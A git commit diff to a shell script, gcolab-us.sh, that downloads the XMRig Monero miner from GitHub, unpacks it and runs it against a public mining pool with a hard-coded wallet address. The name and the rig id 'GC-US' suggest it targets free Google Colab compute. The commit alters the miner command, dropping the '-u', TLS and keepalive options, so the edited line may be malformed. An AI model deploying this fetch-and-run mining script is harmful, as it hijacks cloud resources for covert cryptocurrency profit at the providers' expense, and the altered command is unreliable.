dea067965906f6c088720d553f0287cab6b7354e
juggernaut <93597297+nop3g@users.noreply.github.com>
2022-04-10 10:32:16 +0400

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 41tHm16k3JnFWqcBWDDzWHZc9R6rxaTu77MLMCdwFkAgXERNDNaTS2eh6qMv54WmsL6F6kgqR2DFB9KixJeymYjdGnknKBb -k --tls --rig-id GC-US
+./xmrig -o us-west.minexmr.com:443 41tHm16k3JnFWqcBWDDzWHZc9R6rxaTu77MLMCdwFkAgXERNDNaTS2eh6qMv54WmsL6F6kgqR2DFB9KixJeymYjdGnknKBb --rig-id GC-US
